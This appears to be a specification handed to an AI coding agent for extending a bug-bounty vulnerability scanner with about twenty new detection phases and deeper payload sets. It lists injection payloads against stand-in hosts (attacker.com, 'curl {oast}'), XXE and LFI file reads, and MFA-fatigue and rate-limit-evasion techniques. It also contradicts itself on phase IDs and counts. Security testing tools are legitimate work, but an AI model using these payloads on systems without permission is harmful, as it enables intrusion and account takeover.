# Agent Prompt: BugBountyV2tool — Vulnerability Detection Enhancement

## Overview

Erweitere das VulnForge-Tool (v3.1.0, `vulnforge/` package) um neue Vulnerability-Phasen und vertiefe bestehende Phasen. Ziel: mehr reale Vulnerabilities finden durch Abdeckung von Lücken im aktuellen 185-Phasen-Pipeline.

Der Agent arbeitet NUR im `vulnforge/` Package. `reconchain/` existiert nicht mehr.

## Success Criteria

- **20 neue Phasen** implementiert (IDs 170–189)
- **12 bestehende Phasen** vertieft (mehr Payloads, bessere Coverage)
- Alle neuen Phasen registriert in: PIPELINE, PHASE_DEPS, STAGES, VALID_PHASES, artifacts.py, finding.py, remediation.py
- `ruff check vulnforge/` pass (nur pre-existing F401 in `__init__.py` ignorieren)
- `pytest tests/ -v` — **alle 388+ Tests pass**
- `python3 vulnforge.py --list-phases` zeigt alle neuen Phasen an

## Tech Stack

- Python 3.9+ (stdlib, async patterns)
- Existing phase conventions in `vulnforge/phases/` als Vorlage
- `playwright` for browser-based probes (bereits vorhanden)
- `asyncio` for concurrent probes
- External tools: `dalfox`, `sqlmap`, `ffuf`, `interactsh-client` (bereits installiert)

## File Structure — What to Touch

### New Files
```
vulnforge/phases/client_side_v2.py    # 170-CLIENTPP, 171-CSSINJECT, 172-DANGLING
vulnforge/phases/modern_web.py        # 173-SERVICEWORKER, 174-WASMSEC, 176-JWT2SELF
vulnforge/phases/protocol.py          # 172-SMTPSMUGGLE, 183-CACHEDIG
vulnforge/phases/cms_deep.py          # 185-MAGENTO, 186-SHAREPOINT, 187-CONFLUENCE, 188-CICD, 189-TOMCAT
vulnforge/phases/advanced_inject.py   # 175-OAUTHDEVICE, 177-SELENIUMXSS, 179-WAFBYPASS, 180-SWAGGERABUSE, 181-MFABYPASS, 182-CAPTCHABYPASS, 184-SSRFPARTIAL, 190-BROTLIORACLE
```

### Modified Files
- `vulnforge/phases/__init__.py` — PIPELINE, PHASE_DEPS, STAGES, _PHASE_WEIGHTS, imports
- `vulnforge/config.py` — VALID_PHASES, QUICK_SKIP_PHASES, DOS_PHASES
- `vulnforge/artifacts.py` — ARTIFACTS definitions
- `vulnforge/finding.py` — _VULN_TYPE_CWE, _VULN_TYPE_CVSS, _VULN_TYPE_SEVERITY
- `vulnforge/remediation.py` — REMEDIATIONS entries

### Existing Phase Files (deepening — modify in place)
- `vulnforge/phases/injection.py` — SSTI + SQLMap deepening
- `vulnforge/phases/injection_misc.py` — XXE, NoSQLi, CMDINJECT deepening
- `vulnforge/phases/client_side.py` — LFI, Cache Poisoning, Rate Limit, File Upload, Stored XSS deepening
- `vulnforge/phases/auth.py` — JWT deepening
- `vulnforge/phases/graphql_chain.py` — GraphQL deepening
- `vulnforge/phases/fuzzing.py` — Rate Limit Bypass deepening

## Convention: Phase Signatures

Jede Phase hat diese Signatur:
```python
async def phase_XXX_NAME(
    outdir: Path,
    tools: Tools,
    only: set,
    skip: set,
    domain: str = "",
) -> dict:
```

Gib ein Dict zurück mit `{"findings": [...], "errors": [...]}`. Findings in `vulnforge/utils.py:write_findings()` schreiben.

Output-Files landen in `outdir/artifacts/` und werden in `vulnforge/artifacts.py` als `ArtifactDef` registriert.

## Phase Detail Specifications

### NEW PHASES (IDs 170–189)

Implementiere jede Phase als separate async function. Nutze existierende Helper aus:
- `vulnforge/phases/helpers.py` — `_run`, `_runs`, `_sample_urls`, `_write_hosts`
- `vulnforge/process.py` — `_run_blocking`, `run_parallel`
- `vulnforge/utils.py` — `log`, `ensure`, `read_lines`, `write_findings`
- `vulnforge/tools.py` — `Tools` class

#### 170-CLIENTPP — Client-Side Prototype Pollution
- **Detection**: Playwright-basiert: navigiere zu Seiten, injiziere `__proto__`/`constructor.prototype` via URL params, prüfe auf Reflection + Execution
- **Test**: `Object.prototype.polluted = true` via JSON.parse() in gängigen Libraries (jQuery $.extend, lodash merge, Vue set)
- **Payload patterns**: `?__proto__[test]=true`, `?constructor[prototype][test]=true`
- **Output**: `client_pp.txt`
- **Deps**: `05-HARVEST`

#### 171-CSSINJECT — CSS Injection (wieder eingeführt, war 150)
- **Detection**: Input-Reflektion in `<style>` Blöcken oder `style` Attributen prüfen
- **Payloads**: `</style><img src=x>`, `{background:url(http://oast)}`, `input[value^=a]{background:url(oast)}`
- **Output**: `css_inject.txt`
- **Deps**: `05-HARVEST`

#### 172-DANGLING — Dangling Markup (wieder eingeführt, war 151)
- **Detection**: Input Reflection in HTML ohne Kontext-Escaping prüfen
- **Payloads**: `<img src="//attacker.com/` (schließt nicht), `<form action="//attacker.com"><button>`, `<a href="//attacker.com">`
- **Output**: `dangling_markup.txt`
- **Deps**: `05-HARVEST`

#### 173-SERVICEWORKER — Service Worker Abuse
- **Detection**: Prüfe ob SW registriert werden kann, ob bestehende SW-Code injection erlaubt
- **Checks**: SW registration endpoint exposed, SW script path traversal, postMessage handler ohne origin check
- **Output**: `service_worker.txt`
- **Deps**: `04-SCAN`

#### 174-WASMSEC — WebAssembly Security
- **Detection**: Finde `.wasm` Dateien, extrahiere Strings, prüfe auf hardcodierte Secrets/API keys
- **Checks**: Wasm Binary Analysis (magic bytes `\0asm`), Memory Corruption Patterns
- **Output**: `wasm_findings.txt`
- **Deps**: `06-JSINTEL`

#### 175-OAUTHDEVICE — OAuth Device Grant Pharming
- **Detection**: Prüfe ob `/device`, `/devicecode`, `/oauth/device` Endpoints existieren
- **Checks**: `user_code` rate limiting, `verification_uri` spoofing, completion poll ohne CSRF
- **Output**: `oauth_device.txt`
- **Deps**: `05-HARVEST`

#### 176-JWT2SELF — JWT-to-Self XSS
- **Detection**: Dekodiere JWT claims (`name`, `email`, `preferred_username`), prüfe ob Werte unescaped im DOM landen
- **Payload**: JWT mit `{"name":"<script>alert(1)</script>"}` signieren, request senden, DOM-Check
- **Output**: `jwt_xss.txt`
- **Deps**: `05-HARVEST`

#### 177-SELENIUMXSS — Dynamic DOM-based XSS via Headless
- **Detection**: Playwright headless crawl aller harvested URLs mit event listeners (onerror, onload, onclick)
- **Checks**: MutationObserver auf DOM-Modifikationen, alert/confirm/prompt detection
- **Output**: `dom_xss_dynamic.txt`
- **Deps**: `05-HARVEST`

#### 178-APIRACE — API Race Condition (Dedicated)
- **Detection**: Sende parallele Requests an gleichen Endpunkt; prüfe auf TOCTOU, doppelte Buchungen, Race-Condition
- **Tool**: Nutze `asyncio.gather()` mit 20+ parallelen Requests; vergleiche Response-Bodies
- **Output**: `api_race.txt`
- **Deps**: `05-HARVEST`

#### 179-WAFBYPASS — Advanced WAF Bypass
- **Detection**: Wenn WAF erkannt (Phase 21-WAF), versuche Bypass-Techniken
- **Payloads**: HTTP/2 Padding, chunked encoding tricks, HTTP/1.1 pipelining, Unicode normalization bypass
- **Output**: `waf_bypass.txt`
- **Deps**: `21-WAF`

#### 180-SWAGGERABUSE — Swagger/OpenAPI Abuse
- **Detection**: Parse OpenAPI specs, extrahiere ALLE endpoints + parameter, fuzze jeden endpoint
- **Checks**: Auth bypass, input validation, rate limits, IDOR auf jedem dokumentierten endpoint
- **Output**: `swagger_abuse.txt`
- **Deps**: `05b-APISPEC`

#### 181-MFABYPASS — Advanced MFA Bypass
- **Detection**: Prüfe MFA-Implementierung auf Schwachstellen
- **Checks**: Backup-Code brute-force (rate limit?), MFA fatigue (spam push), device enrollment race, OTP timing attack
- **Output**: `mfa_bypass.txt`
- **Deps**: `05-HARVEST`

#### 182-CAPTCHABYPASS — CAPTCHA Bypass
- **Detection**: Prüfe CAPTCHA-Implementierung auf logische Fehler
- **Checks**: CAPTCHA re-use (gleiche responseID mehrfach), missing captcha auf sub-actions, OCR bypass bei einfachen Captchas
- **Output**: `captcha_bypass.txt`
- **Deps**: `05-HARVEST`

#### 183-CACHEDIG — HTTP/2 Cache Digestion / Web Cache Poisoning Extended
- **Detection**: Prüfe auf unkeyed query parameters, cache key injection via newlines, HTTP/2 cache push
- **Payloads**: `/?unkeyed=1`, `/?cb=123&unkeyed=1`, CRLF injection in header values
- **Output**: `cache_dig.txt`
- **Deps**: `28-CACHED`

#### 184-SSRFPARTIAL — Partial URL / Protocol Smuggling SSRF
- **Detection**: Teste URL-Parameter mit Protokoll-Smuggling Varianten
- **Payloads**: `@`-based redirect (`http://evil@target`), protocol-relative (`//evil`), CRLF-injected SSRF, DNS rebinding
- **Output**: `ssrf_partial.txt`
- **Deps**: `66-SSRF-FULL`

#### 185-MAGENTO — Magento/Adobe Commerce Specific
- **Detection**: Magento-spezifische Tests
- **Checks**: Admin panel exposure (`/admin`), API key disclosure, CVE-2024-XXXX patterns, GraphQL introspection
- **Output**: `magento.txt`
- **Deps**: `10-TLSCMS`

#### 186-SHAREPOINT — SharePoint Security
- **Detection**: SharePoint-spezifische Tests
- **Checks**: SITE collection exposure, workflow bypass, privilege escalation via API, CVE patterns
- **Output**: `sharepoint.txt`
- **Deps**: `10-TLSCMS`

#### 187-CONFLUENCE — Confluence Security
- **Detection**: Confluence-spezifische Tests
- **Checks**: CVE-2023-22518 (broken access), CVE-2023-22527 (template injection), backup exposure
- **Output**: `confluence.txt`
- **Deps**: `10-TLSCMS`

#### 188-CICD — CI/CD / GitLab / Jenkins Exposure
- **Detection**: CI/CD-spezifische Exposure Tests
- **Checks**: Jenkins `/script` console, GitLab `/api/v4/projects` anonymous access, CI pipeline variable leakage, runner abuse
- **Output**: `cicd.txt`
- **Deps**: `10-TLSCMS`

#### 189-TOMCAT — Apache Tomcat in-depth
- **Detection**: Tomcat-spezifische Tests
- **Checks**: Manager app brute-force, AJP connector abuse (Ghostcat), clustered session deserialization
- **Output**: `tomcat.txt`
- **Deps**: `10-TLSCMS`

#### 190-BROTLIORACLE — Brotli Compression Oracle
- **Detection**: Side-channel Attack via Brotli compression ratio
- **Checks**: Sende Requests mit variierenden Secrets im POST body, messe Response-Größe (komprimiert), identifiziere Teile des Secrets via Größenunterschied
- **Output**: `brotli_oracle.txt`
- **Deps**: `05-HARVEST`

---

### DEEPENING EXISTING PHASES

#### B1: 12-SSTI (injection.py)
- **Add**: 10+ Template Engines: Jinja2, Twig, Freemarker, Velocity, Mako, Jade/Pug, Handlebars, Mustache, Dot, Nunjucks
- **Add**: Framework fingerprinting via `{{config}}`, `{{self}}`, `{% debug %}`
- **Add**: Blind SSTI via OOB (`{{ ''.__class__.__mro__[2].__subclasses__() }}` pattern)

#### B2: 25-XXE (injection_misc.py)
- **Add**: SVG XXE (`<svg xmlns="..." xmlns:xlink="..."><image xlink:href="expect://ls"/>`)
- **Add**: DOCX/XML upload XXE (ZIP mit manipulierter .xml)
- **Add**: XInclude attacks
- **Add**: Blind XXE with OAST
- **Add**: Parameter entity OOB exfiltration
- **Add**: Charset-based WAF bypass (UTF-7 XXE)

#### B3: 30-LFI (client_side.py)
- **Add**: PHP wrappers (`php://filter/convert.base64-encode/resource=index.php`)
- **Add**: RFI tests (`http://external`)
- **Add**: Log Poisoning via User-Agent
- **Add**: `/proc/self/environ` tests
- **Add**: Windows path traversal (`..\\..\\windows\\win.ini`)

#### B4: 22-NOSQLI (injection_misc.py)
- **Add**: Firebase REST API probes (`/.json`)
- **Add**: CouchDB-specific payloads
- **Add**: MongoDB `$where` injection payloads

#### B5: 26-CMDINJECT (injection_misc.py)
- **Add**: Time-based (`sleep 5`, `ping -c 5`)
- **Add**: OOB-based (`nslookup {oast}`, `curl {oast}`)
- **Add**: Filter-bypass sequences (newlines, tabs, backticks, `$()`)

#### B6: 24/36-JWT (auth.py)
- **Add**: JWK injection (header)
- **Add**: `kid` path traversal (`kid: ../../public.key`)
- **Add**: Algorithm confusion for more libs (RS256→HS256, EdDSA→HS256)
- **Add**: `jku`/`jwk` header injection

#### B7: 28-CACHED (client_side.py)
- **Add**: Unkeyed cookie poisoning
- **Add**: Vary header poisoning
- **Add**: Cache key injection via newlines

#### B8: 20/132-GRAPHQL (graphql_chain.py)
- **Add**: Batching attack (`[{"query":"..."}, {"query":"..."}]`)
- **Add**: Aliasing-based DoS (100+ aliases)
- **Add**: Field suggestions brute-force
- **Add**: Depth-limit bypass via fragments

#### B9: 34/136-RATELIMIT (fuzzing.py)
- **Add**: `X-Forwarded-For` rotation bypass
- **Add**: IP rotation with proxy list
- **Add**: Distributed rate limit detection

#### B10: 37-FILEUPLOAD (client_side.py)
- **Add**: Polyglot GIF+PHP/JPEG+JS files
- **Add**: Race condition upload (TOCTOU)
- **Add**: ImageMagick command injection (`-delete`, `-resize`)

#### B11: 80-STOREXSS (client_side.py)
- **Add**: Multipage crawl via forms automation (Playwright)
- **Add**: OOB confirmation of stored payload
- **Add**: Stored XSS via file upload filenames

#### B12: 11b-SQLMAP (injection.py)
- **Add**: Second pass with `level=5, risk=3`
- **Add**: DB-specific payloads (MSSQL `xp_cmdshell`, PostgreSQL `COPY`)
- **Add**: Time-based detection with higher timeout

---

## Registration Tasks

### config.py
```python
# Add to VALID_PHASES:
"170-CLIENTPP", "171-CSSINJECT", "172-DANGLING",
"173-SERVICEWORKER", "174-WASMSEC", "175-OAUTHDEVICE",
"176-JWT2SELF", "177-SELENIUMXSS", "178-APIRACE",
"179-WAFBYPASS", "180-SWAGGERABUSE", "181-MFABYPASS",
"182-CAPTCHABYPASS", "183-CACHEDIG", "184-SSRFPARTIAL",
"185-MAGENTO", "186-SHAREPOINT", "187-CONFLUENCE",
"188-CICD", "189-TOMCAT", "190-BROTLIORACLE"

# Update PHASE_CATEGORIES with new group
```

### phases/__init__.py
```python
# Add imports for new phase modules
# Add to PIPELINE list
# Add to PHASE_DEPS (dependencies listed above)
# Add to STAGES (suggest: stage 32 for client_side_v2, 33 for modern_web, etc.)
# Add to _PHASE_WEIGHTS
```

### artifacts.py
```python
# Add ArtifactDef for each new phase output file
ArtifactDef("client_pp.txt", "Client-Side Prototype Pollution", ...)
ArtifactDef("css_inject.txt", "CSS Injection", ...)
# ... etc
```

### finding.py
```python
# Add to _VULN_TYPE_CWE:
"proto_pollution": "CWE-1321",
"css_injection": "CWE-116",
# ... etc

# Add to _VULN_TYPE_CVSS:
# Add to _VULN_TYPE_SEVERITY:
```

### remediation.py
```python
# Add to REMEDIATIONS:
"proto_pollution": "Use Object.create(null) or Object.freeze on prototypes...",
# ... etc
```

## Task List (Execution Order)

| # | Task | What | Verify |
|---|------|------|--------|
| 1 | **Registration prep** | Add ALL new phase IDs to config.py VALID_PHASES | `python3 -c "from vulnforge.config import VALID_PHASES; assert '170-CLIENTPP' in VALID_PHASES"` |
| 2 | **New phase file: client_side_v2.py** | 170-CLIENTPP, 171-CSSINJECT, 172-DANGLING | Phase functions importable |
| 3 | **New phase file: modern_web.py** | 173-SERVICEWORKER, 174-WASMSEC, 176-JWT2SELF | Phase functions importable |
| 4 | **New phase file: protocol.py** | 172-SMTPSMUGGLE (rename to 178), 183-CACHEDIG | Phase functions importable |
| 5 | **New phase file: cms_deep.py** | 185-MAGENTO, 186-SHAREPOINT, 187-CONFLUENCE, 188-CICD, 189-TOMCAT | Phase functions importable |
| 6 | **New phase file: advanced_inject.py** | 175-OAUTHDEVICE, 177-SELENIUMXSS, 179-WAFBYPASS, 180-SWAGGERABUSE, 181-MFABYPASS, 182-CAPTCHABYPASS, 184-SSRFPARTIAL, 190-BROTLIORACLE | Phase functions importable |
| 7 | **Deepen injection.py** | SSTI + SQLMap (B1, B12) | Existing SSTI tests still pass |
| 8 | **Deepen injection_misc.py** | XXE, NoSQLi, CMDINJECT (B2, B4, B5) | Existing tests still pass |
| 9 | **Deepen client_side.py** | LFI, Cache Poisoning, Rate Limit, File Upload, Stored XSS (B3, B7, B9, B10, B11) | Existing tests still pass |
| 10 | **Deepen auth.py** | JWT (B6) | Existing tests still pass |
| 11 | **Deepen graphql_chain.py** | GraphQL (B8) | Existing tests still pass |
| 12 | **Register in phases/__init__.py** | PIPELINE, PHASE_DEPS, STAGES, _PHASE_WEIGHTS, imports | `len(PIPELINE) == 206` |
| 13 | **Register in artifacts.py** | ArtifactDef for all new outputs | ArtifactDefs exist |
| 14 | **Register in finding.py** | _VULN_TYPE_CWE, _VULN_TYPE_CVSS, _VULN_TYPE_SEVERITY | All new types have entries |
| 15 | **Register in remediation.py** | REMEDIATIONS entries | All new types have remediations |
| 16 | **Final verification** | ruff + pytest | All pass |

## Verification

```bash
# 1. Ruff lint (F401 in __init__.py sind pre-existing)
ruff check vulnforge/ 2>&1 | grep -v "F401"

# 2. Tests
pytest tests/ -v --tb=short -q

# 3. Phase enumeration
python3 -c "from vulnforge.phases import PIPELINE; print(f'{len(PIPELINE)} phases registered')"

# 4. Import check
python3 -c "from vulnforge.phases.client_side_v2 import phase_170_CLIENTPP"

# 5. CLI listing
python3 vulnforge.py --list-phases 2>&1 | grep "170-"
```
